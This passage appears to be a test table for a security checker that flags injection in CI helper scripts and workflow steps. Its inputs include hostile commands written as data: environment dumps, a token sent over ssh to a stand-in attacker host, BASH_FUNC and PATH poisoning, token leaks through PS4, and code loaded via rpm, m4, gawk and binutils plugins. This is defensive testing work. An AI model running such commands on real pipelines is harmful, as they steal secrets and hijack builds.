t environ-dequote 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}base64 /proc/self/en\"\"viron"
t redirect-dequote 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo pwn > trusted-\"\"scripts/.github/scripts/muse-review/diff.sh"
t heredoc-false 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf '%s\\n' \"x\\\" <<EOF\"
bash \"\${GITHUB_WORKSPACE}/evil.sh\"
EOF"
t ansi-c 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}\$'ba''sh' \"\${GITHUB_WORKSPACE}/evil.sh\""
t ansi-c-hex 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}\$'\\x62ash' \"\${GITHUB_WORKSPACE}/evil.sh\""
t opt-exec 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}/opt/hostedtoolcache/evil"
t usr-exec-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}/usr/bin/true"

# --- round 8: installer curl config (Codex P1: --config + curlrc) ---
t curl-config 1 "helper-network-tool" happy.sarif "$I${FS}curl --disable --proto${FS}r${FS}curl --disable --proto${FS}curl --disable --config /tmp/evil.curl --proto"
t curl-K 1 "helper-network-tool" happy.sarif "$I${FS}curl --disable --proto${FS}r${FS}curl --disable --proto${FS}curl --disable -K /tmp/evil.curl --proto"
t curl-nodisable 1 "helper-network-tool" happy.sarif "$I${FS}curl --disable --proto${FS}r${FS}curl --disable --proto${FS}curl --proto"
t curl-disable-notfirst 1 "helper-network-tool" happy.sarif "$I${FS}curl --disable --proto${FS}r${FS}curl --disable --proto${FS}curl --proto --disable"

# --- round 9: rpm/m4 loaders, review_file pin ---
t rpm-eval 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}rpm --eval '%(bash \"\${GITHUB_WORKSPACE}/evil.sh\")'"
t m4-syscmd 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}m4 \"\${GITHUB_WORKSPACE}/evil.m4\""
t reviewfile-rebind 1 "helper-reviewfile-rebind" happy.sarif "$R${FS}echo \"review_file=${FS}r${FS}review_file=\${review_file}${FS}review_file=\${GITHUB_WORKSPACE}/evil.json"
t reviewfile-assign 1 "helper-reviewfile-rebind" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}review_file=\${GITHUB_WORKSPACE}/evil.json"

# --- round 10: arithmetic heredocs, hostedtoolcache writes, drift labels ---
t arith-heredoc 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}x=\$((1<<2))
bash \"\${GITHUB_WORKSPACE}/evil.sh\""
t arith-cmd-heredoc 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}((x = 1<<2))
bash \"\${GITHUB_WORKSPACE}/evil.sh\""
t arith-obsolete-heredoc 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}x=$[1<<2]
bash \"\${GITHUB_WORKSPACE}/evil.sh\""
t opt-write-redirect 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo x > /opt/hostedtoolcache/evil"
t opt-write-copy 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cp evil /opt/hostedtoolcache/evil"
t opt-write-step 1 "step-trusted-write" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          echo x > /opt/hostedtoolcache/evil"

# --- round 11: binutils plugins, sensitive cwd ---
t nm-plugin 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}nm --plugin \"\${GITHUB_WORKSPACE}/evil.so\" /bin/true"
t nm-plugin-eq 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}nm-12 --plugin=\"\${GITHUB_WORKSPACE}/evil.so\" /bin/true"
t ar-plugin 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ar --plugin \"\${GITHUB_WORKSPACE}/evil.so\" r lib.a x.o"
t ranlib-plugin 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ranlib --plugin \"\${GITHUB_WORKSPACE}/evil.so\" lib.a"
t ld-plugin-eq 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ld --plugin=\"\${GITHUB_WORKSPACE}/evil.so\" -o out in.o"
t nm-bare-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}nm /bin/true"
t cd-sensitive 1 "helper-sensitive-cwd" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cd \"\${SCRIPT_DIR}\"
cp \"\${GITHUB_WORKSPACE}/evil.sh\" diff.sh"
t cd-tmp-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cd /tmp/work"
t cd-runnertemp-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cd \"\${RUNNER_TEMP}/w\""
t pushd-sensitive 1 "helper-sensitive-cwd" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}pushd \"\${SCRIPT_DIR}\""
t cd-bare 1 "helper-sensitive-cwd" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cd"
t popd-bare 1 "helper-sensitive-cwd" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}popd"

# --- round 12: 7z destinations, hg/julia loaders ---
t sevenz-extract 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}7z x \"\${GITHUB_WORKSPACE}/evil.7z\" \"-o\${SCRIPT_DIR}\" -y"
t sevenz-add 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}7z a \"\${SCRIPT_DIR}/plant.7z\" loot"
t sevenz-extract-cwd-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}7z x evil.7z"
t hg-loader 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}hg init \"\${RUNNER_TEMP}/audit-repo\"
HGRCPATH=\"\${GITHUB_WORKSPACE}/evil.hgrc\" hg -R \"\${RUNNER_TEMP}/audit-repo\" status"
t julia-loader 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}julia \"\${GITHUB_WORKSPACE}/evil.jl\""

# --- round 13: lldb loader, anchor/tag flow steps ---
t lldb-loader 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}lldb -b -s \"\${GITHUB_WORKSPACE}/evil.lldb\" /bin/true"

# --- round 14: dotnet loader, BASH_FUNC env poison (Codex P1s) ---
t dotnet-loader 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}dotnet run --project \"\${GITHUB_WORKSPACE}/evil.csproj\""
t bashfunc-step-env 1 "reviewer-env-poison" happy.sarif "$S${FS}          META_API_KEY:${FS}b${FS}          BASH_FUNC_curl%%: () { evil; }"
t bashfunc-flow-env 1 "reviewer-env-poison" happy.sarif "$S${FS}META_API_KEY: \${{ secrets.META_API_KEY }}${FS}a${FS}        env: {BASH_FUNC_curl%%: x}"
t bashfunc-helper-export 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}export BASH_FUNC_curl%%='() { evil; }'"
t bashfunc-helper-prefix 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}BASH_FUNC_curl%%='() { :; }' /bin/true"
t bashfunc-env-cmd 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}env BASH_FUNC_curl%%=evil /bin/true"
t bashfunc-cmdfile 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo \"BASH_FUNC_curl%%=() { evil; }\" >> \"\$GITHUB_ENV\""
t bashfunc-step-run 1 "secret-step-path-hijack" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          export BASH_FUNC_curl%%='() { evil; }'"
t bashfunc-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo BASH_FUNC_curl"

# --- round 15: loaders, debugger/env poison, awk+jq options (Codex P1s) ---
t tclsh-loader 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}tclsh \"\${GITHUB_WORKSPACE}/evil.tcl\""
t tclsh-versioned 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}tclsh8.6 \"\${GITHUB_WORKSPACE}/evil.tcl\""
t expect-loader 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}expect \"\${GITHUB_WORKSPACE}/evil.exp\""
t autoconf-loader 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}autoconf \"\${GITHUB_WORKSPACE}/evil.ac\" > \"\${RUNNER_TEMP}/configure\""
t autom4te-loader 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}autom4te \"\${GITHUB_WORKSPACE}/evil.m4\""
t perl5db-exact 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}PERL5DB='BEGIN{print 1} sub DB::DB{}' perl -d \"\${SCRIPT_DIR}/ranges.pl\""
t perl-debug-flag 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}perl -d \"\${SCRIPT_DIR}/ranges.pl\""
t perl-debug-bundle 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}perl -wd \"\${SCRIPT_DIR}/ranges.pl\""
t perl-module-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}perl -MData::Dumper \"\${SCRIPT_DIR}/ranges.pl\""
t python-ver 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}python3.12 \"\${GITHUB_WORKSPACE}/evil.py\""
t bashcmds-printf 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf -v 'BASH_CMDS[pwn]' %s \"\${GITHUB_WORKSPACE}/evil.sh\"; pwn"
t bashcmds-direct 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}BASH_CMDS[pwn]=\"\${GITHUB_WORKSPACE}/evil.sh\""
t path-plus-eq 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}PATH+=/evil"
t path-subscript 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}PATH[0]=/evil /bin/true"
t shellopts-ps4-env 1 "reviewer-env-poison" happy.sarif "$S${FS}GH_TOKEN: \${{ secrets.GITHUB_TOKEN }}${FS}a${FS}          SHELLOPTS: xtrace${RS}$S${FS}SHELLOPTS: xtrace${FS}a${FS}          PS4: '\${GH_TOKEN:0:4} \${GH_TOKEN:4} '"
t split-string 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}env --split-string 'bash \"\${GITHUB_WORKSPACE}/evil.sh\"'"
t split-string-eq 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}env --split-string='bash evil.sh'"
t gawk-exec-eq 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gawk --exec=\"\${GITHUB_WORKSPACE}/evil.awk\" </dev/null"
t gawk-exec-sep 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gawk -E \"\${GITHUB_WORKSPACE}/evil.awk\""
t gawk-exec-abbrev 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gawk --ex=\"\${GITHUB_WORKSPACE}/evil.awk\""
t gawk-debug 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gawk -D 'BEGIN{}'"
t gawk-W 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gawk -W debug 'BEGIN{}'"
t gawk-profile-out 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gawk -o\${SCRIPT_DIR}/x 'BEGIN{}'"
t jq-runtests 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}jq --run-tests \"\${GITHUB_WORKSPACE}/evil.jq\""
t jq-indent 1 "helper-jq-env" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}jq --indent 4 '\$ENV.HOME'"

# --- round 16: awk gaps (cursor), kotlin/envsubst/sshpass (Codex P1s) ---
t awk-e-separate 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}awk 'BEGIN{}' -e 'system(\"id\")'"
t profile-bare 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gawk --profile 'BEGIN{}'"
t dump-short-bare 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gawk -d 'BEGIN{}'"
t dump-short-attached 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gawk -d\${SCRIPT_DIR}/x 'BEGIN{}'"
t kotlinc-script 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}kotlinc -script \"\${GITHUB_WORKSPACE}/evil.kts\""
t kotlin-run 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}kotlin \"\${GITHUB_WORKSPACE}/evil.kts\""
t envsubst-prompt 1 "helper-secret-expand" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}envsubst '\$GH_TOKEN' <<< '\$GH_TOKEN' >> \"\${prompt_file}\""
t sshpass-wrap 1 "helper-network-tool" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}sshpass -p password ssh -o SendEnv=GH_TOKEN user@attacker"
t ssh-askpass-env 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}SSH_ASKPASS=/evil ssh x"
